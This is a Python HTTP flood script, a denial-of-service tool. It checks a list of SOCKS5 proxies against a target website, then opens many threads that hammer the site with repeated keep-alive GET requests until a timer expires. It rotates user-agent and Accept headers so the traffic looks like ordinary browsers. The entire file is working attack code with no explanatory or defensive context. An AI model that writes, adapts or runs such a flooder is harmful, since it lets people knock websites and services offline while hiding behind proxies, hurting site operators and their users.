import socket
import ssl
import time
import threading
import random
import sys
import socks
import colorama
colorama.init(autoreset=True)
from colorama import Fore

try:
    target = str(sys.argv[1])
    timer = float(sys.argv[2])
    limit = int(sys.argv[3])
    threads = int(sys.argv[4])
    proxfile = str(sys.argv[5])
except:
    sys.exit()

try:
    proxies = open(proxfile).read().split()
except:
    sys.exit()

url = target
if url[:7] == "http://":
    protocol = "http"
    port = 80
    url = url[7:]
if url[:8] == "https://":
    protocol = "https"
    port = 443
    url = url[8:]
url = url.split("/")
target = url[0]
try:
    path = "/"+url[1]
except:
    path = "/"

useragents = [
              "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247",
              "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko",
              "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36",
              "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3599.0 Safari/537.36",
              "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
              "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36",
              "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36",
              "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36",
              "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
              ]

acceptall = [
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
             "Accept-Encoding: gzip, deflate\r\n",
             "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
             "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
             "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
             "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
             "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
             "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
             "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
             "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
             "Accept: text/html, application/xhtml+xml\r\n",
             "Accept-Language: en-US,en;q=0.5\r\n",
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
             "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"
             ]

working_proxies = []
working_num = 0
start = False
exitcheck = False

def checker():
    global working_proxies
    global proxies
    global working_num
    global exitcheck
    try:
        ua = random.choice(useragents)
        accept = random.choice(acceptall)
    except:
        pass
    while True:
        try:
            if proxies == []:
                break
            if exitcheck == True:
                break
            proxy = proxies[0]
            proxies.remove(proxy)
            proxy = proxy.split(":")
        except:
            pass
        try:
            s = socks.socksocket()
            s.settimeout(5)
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if exitcheck == True:
                break
            s.connect((target, port))
            if exitcheck == True:
                break
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s,server_hostname=target)
            s.send(str.encode("GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + ua + "\r\n" + accept + "Connection: keep-alive\r\n\r\n"))
            working_proxies.append(proxy[0]+":"+proxy[1])
            working_num += 1
            s.close()
        except:
            pass

for x in range(1000):
    th = threading.Thread(target=checker)
    th.setDaemon(True)
    th.start()

time.sleep(15)
exitcheck = True

timeout = time.time() + 1 * timer

def attack():
    global start
    try:
        proxy = random.choice(working_proxies)
        proxy = proxy.split(":")
        ua = random.choice(useragents)
        accept = random.choice(acceptall)
        while time.time() < timeout:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((target, port))
            if protocol == "https":
                s = ssl.SSLContext().wrap_socket(s,server_hostname=target)
            for x in range(limit):
                s.send(str.encode("GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + ua + "\r\n" + accept + "Connection: keep-alive\r\n\r\n"))
                time.sleep(0.1)
            s.close()
        return
        sys.exit()
    except:
        pass

for x in range(threads):
    time.sleep(0.007)
    th = threading.Thread(target=attack)
    th.setDaemon(True)
    th.start()

def keep():
    while time.time() < timeout:
        try:
            time.sleep(0.05)
        except KeyboardInterrupt:
            sys.exit()
    return
    sys.exit()

keep()